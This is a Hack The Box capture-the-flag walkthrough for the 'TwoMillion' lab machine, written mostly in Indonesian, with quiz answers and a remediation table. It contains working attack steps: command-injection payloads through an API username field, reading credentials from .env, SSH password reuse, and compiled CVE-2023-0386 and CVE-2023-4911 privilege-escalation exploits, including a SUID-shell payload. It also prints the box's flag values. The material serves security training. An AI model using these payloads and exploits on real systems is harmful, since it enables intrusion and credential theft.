# HTB TwoMillion — Full Walkthrough (Linux)

> **Box:** TwoMillion · **OS:** Linux (Ubuntu 22.04.2 LTS) · **Difficulty:** Easy
> **Target:** `10.129.131.194` · **Domain:** `2million.htb` · **Kernel:** `5.15.70-051570-generic`
> **Attack path:** JS invite API → kode undangan (ROT13 + Base64) → register/login → API route list → mass assignment jadi admin → command injection (RCE) → `.env` → password reuse (SSH) → **CVE-2023-0386** (overlayfs) → root
> **Privesc alternatif:** **CVE-2023-4911** "Looney Tunables" (glibc 2.35)

---

## 🏁 Flags

| Flag | Nilai |
|------|-------|
| **user.txt** | `78e5bedac3c30bf3b95953d0a4cb90ea` |
| **root.txt** | `047fe2ce975fdb9376f117f87c528ae9` |

## 🧩 Jawaban Quiz (semua terverifikasi langsung di box)

| # | Pertanyaan | Jawaban |
|---|-----------|---------|
| 1 | File JS yang dimuat halaman `/invite` (kode undangan) | **`inviteapi.min.js`** |
| 2 | Fungsi JS pemberi petunjuk pertama cara dapat kode undangan | **`makeInviteCode`** |
| 3 | Penyandian biner-ke-teks untuk nilai kode | **Base64** |
| 4 | Path endpoint saat klik "Connection Pack" | **`/api/v1/user/vpn/generate`** |
| 5 | Jumlah endpoint API di bawah `/api/v1/admin` | **3** |
| 6 | Endpoint yang mengubah akun jadi admin | **`PUT /api/v1/admin/settings/update`** |
| 7 | Endpoint dengan kerentanan command injection | **`POST /api/v1/admin/vpn/generate`** |
| 8 | File penyimpan variabel lingkungan pada aplikasi PHP | **`.env`** |
| 9 | Alamat email pengirim email ke admin | **`ch4p@2million.htb`** |
| 10 | CVE 2023 (OverlayFS, pertahankan owner + SetUID bit) | **`CVE-2023-0386`** |
| 11 | Versi GLIBC di TwoMillion | **`2.35`** |
| 12 | CVE 2023 buffer overflow di dynamic loader GNU C | **`CVE-2023-4911`** |
| 13 | Variabel lingkungan pemicu buffer overflow Looney Tunables | **`GLIBC_TUNABLES`** |

---

## 🧰 Tools yang Dipakai

| Tool | Fungsi |
|------|--------|
| `nmap` | Recon port & service |
| `curl` | Enumerasi web/API, eksploitasi |
| `scp` (via `expect`) | Transfer file/exploit ke target |
| `ssh` (via `expect`) | Foothold & enumerasi |
| `gcc`, `make` | Kompilasi exploit di target |
| `CVE-2023-0386` (xkaneiki) | Privesc overlayfs |

---

## 🔎 Step 1 — Reconnaissance

```bash
nmap -Pn -sCV -p- --min-rate 1500 --max-retries 2 10.129.131.194
```
Hasil: **22/tcp (SSH OpenSSH 8.2p1)**, **80/tcp (HTTP nginx)**.

Akses web: IP me-redirect ke domain **`2million.htb`**.
```bash
curl -s -i http://10.129.131.194/ | head -8
```
Output:
```
HTTP/1.1 301 Moved Permanently
Server: nginx
Location: http://2million.htb/
```
> 🧠 **Analisis:** Aplikasi memakai *virtual host* `2million.htb`. Semua request berikutnya pakai header **`Host: 2million.htb`** (atau tambahkan `10.129.131.194 2million.htb` ke `/etc/hosts`).

```bash
# Tambahkan ke /etc/hosts (opsional):
echo "10.129.131.194 2million.htb" | sudo tee -a /etc/hosts
# Verifikasi vhost:
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: 2million.htb" http://10.129.131.194/
```

---

## 🎟️ Step 2 — Kode Undangan (Invite) ✅ Quiz #1, #2, #3

### 2.1 Halaman `/invite` dan file JS-nya ✅ Quiz #1

```bash
curl -s -H "Host: 2million.htb" http://10.129.131.194/invite | grep -oE '<script[^>]*src="[^"]*"'
```
Output:
```html
<script src="/js/htb-frontend.min.js"></script>
<script defer src="/js/inviteapi.min.js"></script>
```
> ✅ **Quiz #1 — file JS kode undangan = `inviteapi.min.js`** (path `/js/inviteapi.min.js`).

### 2.2 Analisis `inviteapi.min.js` ✅ Quiz #2

File di-obfuscate *Packer* (Dean Edwards). Setelah didekode:
```bash
curl -s -H "Host: 2million.htb" http://10.129.131.194/js/inviteapi.min.js -o inviteapi.min.js
```
Isi yang sudah didekode:
```javascript
function verifyInviteCode(code) {           // verifikasi kode
  var formData = {"code": code};
  $.ajax({ type:"POST", dataType:"json", data:formData,
           url:'/api/v1/invite/verify',
           success:function(r){console.log(r)}, error:function(r){console.log(r)} });
}
function makeInviteCode() {                 // ← pemberi PETUNJUK PERTAMA
  $.ajax({ type:"POST", dataType:"json",
           url:'/api/v1/invite/how/to/generate',
           success:function(r){console.log(r)}, error:function(r){console.log(r)} });
}
```
> ✅ **Quiz #2 — fungsi pemberi petunjuk pertama = `makeInviteCode`** (memanggil `/api/v1/invite/how/to/generate`).

### 2.3 Petunjuk pertama (ROT13)

```bash
curl -s -X POST -H "Host: 2million.htb" http://10.129.131.194/api/v1/invite/how/to/generate
```
Output:
```json
{"0":200,"success":1,
 "data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
         "enctype":"ROT13"},
 "hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
Decode ROT13 → `In order to generate the invite code, make a POST request to /api/v1/invite/generate`.

### 2.4 Generate kode undangan (Base64) ✅ Quiz #3

```bash
curl -s -X POST -H "Host: 2million.htb" http://10.129.131.194/api/v1/invite/generate
```
Output:
```json
{"0":200,"success":1,"data":{"code":"SjA3VzItMDUxWlotOU5RMUUtNlo2Mlk=","format":"encoded"}}
```
Decode Base64:
```bash
echo -n "SjA3VzItMDUxWlotOU5RMUUtNlo2Mlk=" | base64 -d
# J07W2-051ZZ-9NQ1E-6Z62Y
```
> ✅ **Quiz #3 — penyandian = Base64** (ciri: padding `=`, charset `A–Za–z0–9+/`). Field `format:"encoded"` menandakannya masih tersandi.

---

## 👤 Step 3 — Register & Login

Form register memakai field: `username`, `email`, `password`, `password_confirmation`, `code`.
Form login memakai: `email`, `password`.

```bash
# Verifikasi kode undangan
curl -s -X POST -H "Host: 2million.htb" -H "Content-Type: application/json" \
  -d '{"code":"J07W2-051ZZ-9NQ1E-6Z62Y"}' \
  http://10.129.131.194/api/v1/invite/verify

# Register
curl -s -X POST -H "Host: 2million.htb" \
  --data-urlencode "username=pentest27070" \
  --data-urlencode "email=pentest27070@test.htb" \
  --data-urlencode "password=Password123!" \
  --data-urlencode "password_confirmation=Password123!" \
  --data-urlencode "code=J07W2-051ZZ-9NQ1E-6Z62Y" \
  http://10.129.131.194/api/v1/user/register

# Login (simpan cookie sesi)
curl -s -i -X POST -H "Host: 2million.htb" \
  --data-urlencode "email=pentest27070@test.htb" \
  --data-urlencode "password=Password123!" \
  http://10.129.131.194/api/v1/user/login -c cookies.txt | head
```
Output login: `HTTP/1.1 302 Found`, `Set-Cookie: PHPSESSID=...`, `Location: /home`.

> 🧠 **Analisis:** Aplikasi = **Laravel (PHP)** + sesi `PHPSESSID`. Setelah login kita dapat cookie untuk mengakses dashboard `/home`.

---

## 🌐 Step 4 — Enumerasi API ✅ Quiz #4, #5

### 4.1 Halaman Access & tombol "Connection Pack" ✅ Quiz #4

```bash
curl -s -H "Host: 2million.htb" -b cookies.txt http://10.129.131.194/home/access | grep -o 'href="/api[^"]*"'
```
HTML tombol:
```html
<a href="/api/v1/user/vpn/generate" class="btn ...">Connection Pack</a>
<a href="/api/v1/user/vpn/regenerate" class="btn ...">Regenerate</a>
... link unduh: <a href="/api/v1/user/vpn/download">here</a>
```
> ✅ **Quiz #4 — endpoint "Connection Pack" = `/api/v1/user/vpn/generate`**.

### 4.2 Route list bocor di `/api/v1` ✅ Quiz #5

```bash
curl -s -H "Host: 2million.htb" -H "Accept: application/json" -b cookies.txt \
  http://10.129.131.194/api/v1
```
Output (ringkas):
```json
{"v1":{
  "user":{
    "GET":{"/api/v1":"Route List",
           "/api/v1/invite/how/to/generate":"...",
           "/api/v1/invite/generate":"...",
           "/api/v1/invite/verify":"...",
           "/api/v1/user/auth":"...",
           "/api/v1/user/vpn/generate":"Generate a new VPN configuration",
           "/api/v1/user/vpn/regenerate":"...",
           "/api/v1/user/vpn/download":"..."},
    "POST":{"/api/v1/user/register":"...","/api/v1/user/login":"..."}},
  "admin":{
    "GET": {"/api/v1/admin/auth":"Check if user is admin"},
    "POST":{"/api/v1/admin/vpn/generate":"Generate VPN for specific user"},
    "PUT": {"/api/v1/admin/settings/update":"Update user settings"}}}}
```
> ✅ **Quiz #5 — jumlah endpoint `/api/v1/admin` = 3**:
> 1. `GET  /api/v1/admin/auth`
> 2. `POST /api/v1/admin/vpn/generate`
> 3. `PUT  /api/v1/admin/settings/update`
>
> 🧠 **Analisis:** `/api/v1/admin` sendiri di-301 ke `/404` (menghindari bruteforce), tetapi **`/api/v1` membocorkan route list** semua endpoint — *information disclosure*.

---

## 🛡️ Step 5 — Eskalasi ke Admin (Mass Assignment) ✅ Quiz #6

```bash
curl -s -X PUT -H "Host: 2million.htb" -H "Content-Type: application/json" \
  -b cookies.txt -d '{"email":"pentest27070@test.htb","is_admin":1}' \
  http://10.129.131.194/api/v1/admin/settings/update
```
Output:
```json
{"id":13,"username":"pentest27070","is_admin":1}
```
Verifikasi:
```bash
curl -s -H "Host: 2million.htb" -b cookies.txt http://10.129.131.194/api/v1/admin/auth
# {"message":true}
```
> ✅ **Quiz #6 — endpoint = `PUT /api/v1/admin/settings/update`**.
> 🧠 **Analisis (Mass Assignment / Broken Access Control):** parameter **`is_admin`** diterima dari input user tanpa validasi → user biasa bisa mengangkat dirinya jadi admin.

---

## 💥 Step 6 — Command Injection (RCE) ✅ Quiz #7

Uji injeksi (timing):
```bash
# baseline
curl -s -X POST -H "Content-Type: application/json" -b cookies.txt \
  -d '{"username":"x"}' http://10.129.131.194/api/v1/admin/vpn/generate   # ~0s
# payload
curl -s -X POST -H "Content-Type: application/json" -b cookies.txt \
  -d '{"username":"x; sleep 5"}' http://10.129.131.194/api/v1/admin/vpn/generate   # ~7s ✅
```

Eksekusi perintah (output ikut di respons):
```bash
curl -s -X POST -H "Content-Type: application/json" -b cookies.txt \
  -d '{"username":"test;id;whoami"}' http://10.129.131.194/api/v1/admin/vpn/generate
```
Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
> ✅ **Quiz #7 — endpoint = `POST /api/v1/admin/vpn/generate`**.
> 🧠 **Analisis:** Endpoint membuat config OpenVPN dengan menyisipkan `username` **langsung ke perintah shell** tanpa sanitasi → **command injection** sebagai `www-data`. Output perintah ikut kembali di body respons.

---

## 📄 Step 7 — Loot `.env` & Foothold ✅ Quiz #8

```bash
curl -s -X POST -H "Content-Type: application/json" -b cookies.txt \
  -d '{"username":"test;echo START;cat /var/www/html/.env;echo END"}' \
  http://10.129.131.194/api/v1/admin/vpn/generate | sed -n '/START/,/END/p'
```
Output:
```
START
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
END
```
> ✅ **Quiz #8 — file variabel lingkungan PHP = `.env`** (Laravel menyimpan kredensial di sini).

**Foothold via SSH (password reuse):**
```bash
ssh admin@10.129.131.194      # password: SuperDuperPass123
```
Output:
```
admin@2million:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@2million:~$ cat /home/admin/user.txt
78e5bedac3c30bf3b95953d0a4cb90ea
```
> 🏁 **user.txt = `78e5bedac3c30bf3b95953d0a4cb90ea`**

---

## ⚡ Step 8 — Privilege Escalation: CVE-2023-0386 (OverlayFS) ✅ Quiz #10

### 8.1 Enumerasi

```bash
uname -r            # 5.15.70-051570-generic  → rentan overlayfs
sudo -l             # butuh password
find / -perm -4000 -type f 2>/dev/null   # SUID standar
getcap -r / 2>/dev/null                   # capability standar
```
> ✅ **Quiz #10 — CVE = `CVE-2023-0386`** (overlayfs: copy-up mempertahankan owner + SetUID bit).
> 🧠 **Analisis:** Bug saat **copy-up overlayfs** — kernel gagal memverifikasi kepemilikan. File dari lower layer (via **FUSE**) dapat dipindah ke upper layer **sambil mempertahankan metadata (owner & SetUID)** → file jadi milik **root dengan SUID**.

### 8.2 Transfer & kompilasi exploit

```bash
# Di attacker: siapkan PoC
git clone https://github.com/xkaneiki/CVE-2023-0386
# Transfer ke target
scp -r exp.c fuse.c getshell.c Makefile ovlcap admin@10.129.131.194:/tmp/exp_send/
# Di target:
cd /tmp/exp_send && make all      # gcc fuse/exp/gc
```

### 8.3 Jalankan exploit

```bash
# Terminal 1 — FUSE server (mount file SUID palsu di lower dir)
./fuse ./ovlcap/lower ./gc &
# Terminal 2 — trigger copy-up
./exp
```
Output:
```
[+] mount success
-rwsrwxrwx 1 nobody nogroup 16048 file     ← file SUID "nyasar" ke upper dir
[+] exploit success!
```
Payload `getshell.c` yang kita pakai (mengambil flag langsung):
```c
int main(){
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rbash; chmod 4755 /tmp/rbash");
    system("id > /tmp/whoami.txt; chmod 666 /tmp/whoami.txt");
    system("cat /root/root.txt > /tmp/root_flag.txt; chmod 666 /tmp/root_flag.txt");
    return 0;
}
```
Hasil:
```
$ cat /tmp/whoami.txt
uid=0(root) gid=0(root) groups=0(root),1000(admin)
$ cat /tmp/root_flag.txt
047fe2ce975fdb9376f117f87c528ae9
```
> 🏁 **root.txt = `047fe2ce975fdb9376f117f87c528ae9`**

---

## 📬 Step 9 — Local Mail (info sensitif) ✅ Quiz #9

Saat login SSH, banner menampilkan **"You have mail."**
```bash
cat /var/mail/admin
```
Output:
```
From: ch4p <ch4p@2million.htb>          ← pengirim
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
X-Mailer: ThunderMail Pro 5.2

Hey admin,
... can you also upgrade the OS on our web host? There have been a few
serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE
looks nasty. We can't get popped by that.

HTB Godfather
```
> ✅ **Quiz #9 — email pengirim = `ch4p@2million.htb`**.
> 🧠 **Analisis:** Email internal membocorkan **petunjuk privesc** (OverlayFS/FUSE = CVE-2023-0386). Contoh *sensitive info in local mail*.

---

## 🔁 Step 10 — Privesc Alternatif: CVE-2023-4911 "Looney Tunables" ✅ Quiz #11, #12, #13

### 10.1 Versi glibc ✅ Quiz #11

```bash
ldd --version | head -2
```
Output:
```
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```
> ✅ **Quiz #11 — versi GLIBC = `2.35`** (rentan Looney Tunables).

### 10.2 CVE & pemicu ✅ Quiz #12, #13

> ✅ **Quiz #12 — CVE = `CVE-2023-4911`** ("Looney Tunables").
> ✅ **Quiz #13 — variabel lingkungan pemicu = `GLIBC_TUNABLES`**.
>
> 🧠 **Analisis:** **Buffer overflow** di **dynamic loader GNU C (`ld.so`)** saat mem-parsing **`GLIBC_TUNABLES`** (fungsi `parse_tunables()`). Penyerang lokal memicu *heap overflow* dan menimpa jalur pustaka, lalu mengeksekusi kode sebagai **root** via binary **SUID** (mis. `/usr/bin/su`).

### 10.3 PoC (referensi: `leesh3288/CVE-2023-4911`)

```bash
git clone https://github.com/leesh3288/CVE-2023-4911
# exp.c : memicu overflow via GLIBC_TUNABLES, menjalankan /usr/bin/su --help
# gen_libc.py : membuat libc.so.6 palsu (shellcode setuid(0)+setgid(0)+sh)
```
Konsep inti `exp.c`:
```c
char *argv[] = {"/usr/bin/su", "--help", NULL};
// envp diisi dengan banyak GLIBC_TUNABLES=glibc.malloc.mxfast=... (padding + payload)
// memalsukan struct link_map l_info[DT_RPATH] → menunjuk direktori berisi libc.so.6 palsu
// fork+execve berulang sampai shell root muncul
```
Alur:
```bash
python3 gen_libc.py        # butuh pwntools → hasilkan ./libc.so.6 (dengan shellcode)
gcc -o exp exp.c
./exp                      # → shell sebagai root
```
> 📝 **Catatan:** Pada sesi ini, target `10.129.131.194` sudah tidak terjangkau (*No route to host* — box kemungkinan di-reset/expired) sebelum PoC Looney Tunables dijalankan. Namun **root sudah didapat lebih dulu via CVE-2023-0386**. Langkah Looney Tunables ini adalah jalur **alternatif** yang setara.

---

## ⛓️ Full Attack Chain (ringkas)

```
1. RECON     nmap → 22 (SSH), 80 (nginx vhost 2million.htb)
2. INVITE    /invite → /js/inviteapi.min.js → makeInviteCode()        ✅ Quiz 1,2
             POST /api/v1/invite/how/to/generate → hint ROT13
             POST /api/v1/invite/generate → Base64                       ✅ Quiz 3
             base64 -d → kode undangan (J07W2-051ZZ-9NQ1E-6Z62Y)
3. REGISTER  POST /api/v1/user/register → login (PHPSESSID)
4. ENUM      GET /api/v1 → route list → 3 endpoint admin                ✅ Quiz 5
             tombol "Connection Pack" → /api/v1/user/vpn/generate       ✅ Quiz 4
5. ADMIN     PUT /api/v1/admin/settings/update {"is_admin":1}           ✅ Quiz 6
6. RCE       POST /api/v1/admin/vpn/generate {"username":"x;id"}        ✅ Quiz 7
             → www-data
7. LOOT      cat /var/www/html/.env                                     ✅ Quiz 8
             → admin : SuperDuperPass123
8. FOOTHOLD  ssh admin → user.txt = 78e5bedac3c30bf3b95953d0a4cb90ea
9. MAIL      cat /var/mail/admin → ch4p@2million.htb                    ✅ Quiz 9
10. PRIVESC  CVE-2023-0386 (overlayfs, kernel 5.15.70)                  ✅ Quiz 10
             → ROOT → root.txt = 047fe2ce975fdb9376f117f87c528ae9
11. ALT      CVE-2023-4911 (glibc 2.35, GLIBC_TUNABLES)                 ✅ Quiz 11,12,13
```

## 🗝️ Credential & Info Chain

| Ditemukan di | Nilai | Dipakai untuk |
|--------------|-------|---------------|
| `inviteapi.min.js` → `/api/v1/invite/generate` | kode undangan (Base64) | Register akun |
| Command injection → `/var/www/html/.env` | `admin : SuperDuperPass123` | **SSH** (password reuse) |
| SSH sebagai `admin` | — | user.txt |
| `/var/mail/admin` | `ch4p@2million.htb` | petunjuk privesc |
| CVE-2023-0386 | — | **root** |

## 🌐 Peta Endpoint API

| Method | Endpoint | Fungsi |
|--------|----------|--------|
| GET | `/api/v1` | **Route List** (bocor!) |
| GET | `/api/v1/invite/how/to/generate` | Petunjuk (ROT13) |
| GET | `/api/v1/invite/generate` | Generate kode (Base64) |
| POST | `/api/v1/invite/verify` | Verifikasi kode |
| POST | `/api/v1/user/register` | Register |
| POST | `/api/v1/user/login` | Login |
| GET | `/api/v1/user/auth` | Cek login |
| GET | `/api/v1/user/vpn/generate` | Connection Pack |
| GET | `/api/v1/user/vpn/regenerate` | Regenerate VPN |
| GET | `/api/v1/user/vpn/download` | Unduh OVPN |
| GET | `/api/v1/admin/auth` | Cek admin |
| POST | `/api/v1/admin/vpn/generate` | **Command Injection** |
| PUT | `/api/v1/admin/settings/update` | **Mass Assignment (is_admin)** |

---

## 📋 Cheat Sheet Perintah

```bash
# --- Recon ---
nmap -Pn -sCV -p- --min-rate 1500 10.129.131.194
echo "10.129.131.194 2million.htb" | sudo tee -a /etc/hosts

# --- Invite ---
curl -s -H "Host: 2million.htb" http://2million.htb/invite | grep -oE 'src="[^"]*\.js"'
curl -s -H "Host: 2million.htb" http://2million.htb/js/inviteapi.min.js
curl -s -X POST -H "Host: 2million.htb" http://2million.htb/api/v1/invite/how/to/generate   # ROT13
curl -s -X POST -H "Host: 2million.htb" http://2million.htb/api/v1/invite/generate          # Base64
echo -n "SjA3VzItMDUxWlotOU5RMUUtNlo2Mlk=" | base64 -d                                     # kode

# --- Register / Login ---
curl -s -X POST -H "Host: 2million.htb" \
  --data-urlencode "username=USER" --data-urlencode "email=USER@test.htb" \
  --data-urlencode "password=Password123!" --data-urlencode "password_confirmation=Password123!" \
  --data-urlencode "code=J07W2-051ZZ-9NQ1E-6Z62Y" http://2million.htb/api/v1/user/register
curl -s -i -X POST -H "Host: 2million.htb" \
  --data-urlencode "email=USER@test.htb" --data-urlencode "password=Password123!" \
  http://2million.htb/api/v1/user/login -c cookies.txt

# --- Enumerasi API ---
curl -s -H "Host: 2million.htb" -H "Accept: application/json" -b cookies.txt http://2million.htb/api/v1

# --- Jadi Admin ---
curl -s -X PUT -H "Host: 2million.htb" -H "Content-Type: application/json" -b cookies.txt \
  -d '{"email":"USER@test.htb","is_admin":1}' http://2million.htb/api/v1/admin/settings/update

# --- RCE (command injection) ---
curl -s -X POST -H "Host: 2million.htb" -H "Content-Type: application/json" -b cookies.txt \
  -d '{"username":"test;id"}' http://2million.htb/api/v1/admin/vpn/generate
curl -s -X POST -H "Host: 2million.htb" -H "Content-Type: application/json" -b cookies.txt \
  -d '{"username":"x;cat /var/www/html/.env"}' http://2million.htb/api/v1/admin/vpn/generate

# --- Foothold ---
ssh admin@2million.htb            # SuperDuperPass123
cat /home/admin/user.txt

# --- Privesc (CVE-2023-0386) ---
uname -r
git clone https://github.com/xkaneiki/CVE-2023-0386
scp -r CVE-2023-0386 admin@2million.htb:/tmp/exp_send/
# di target:
cd /tmp/exp_send && make all
./fuse ./ovlcap/lower ./gc &
./exp
cat /root/root.txt

# --- Mail ---
cat /var/mail/admin

# --- Privesc alternatif (CVE-2023-4911) ---
ldd --version | head -1           # 2.35
# PoC: https://github.com/leesh3288/CVE-2023-4911
# pemicu: variabel GLIBC_TUNABLES
```

---

## 🛡️ Remediation (Perbaikan)

| # | Kerentanan | Perbaikan |
|---|-----------|-----------|
| 1 | **API route list** bocor di `/api/v1` | Matikan/deaktifkan endpoint listing di produksi |
| 2 | **Mass Assignment** (`is_admin` dari input) | *Whitelist* field yang boleh diubah; jangan pernah terima flag privilege dari client |
| 3 | **Command Injection** di `/api/v1/admin/vpn/generate` | Hindari `shell_exec` dengan input user; gunakan argumen ter-escape (`escapeshellarg`) atau API native |
| 4 | **Kredensial di `.env`** bocor | Batasi permission file; jangan simpan rahasia di webroot; gunakan secret manager |
| 5 | **Password reuse** (DB/app = SSH) | Password unik per layanan; rotasi berkala |
| 6 | **Kernel rentan** (CVE-2023-0386 / CVE-2023-4911) | Patch kernel & glibc; upgrade OS (sesuai email `ch4p`) |
| 7 | **SUID berlebih / akses FUSE** | Audit SUID; batasi unprivileged user namespace/FUSE |

**Pelajaran kunci:**
- **JS frontend bocorkan endpoint** — selalu baca file `.js` untuk menemukan API tersembunyi.
- **`/api/v1` yang menampilkan route list** = shortcut enumerasi.
- **Mass assignment** pada parameter privilege (`is_admin`) = eskalasi instan.
- **Command injection** sering di fitur yang memanggil shell (generate config/backup).
- **`.env`** = sumber kredensial; coba **password reuse** ke SSH.
- **Cek email lokal** (`/var/mail`) — sering berisi petunjuk privesc.
- **Cek versi kernel & glibc** untuk CVE publik (overlayfs, Looney Tunables).

---

*Dokumentasi dibuat: 2026-10-14 · Box: HTB TwoMillion · Target: 10.129.131.194 (2million.htb)*
*Catatan: box sudah tidak terjangkau saat PoC Looney Tunables dijalankan; root diperoleh via CVE-2023-0386.*
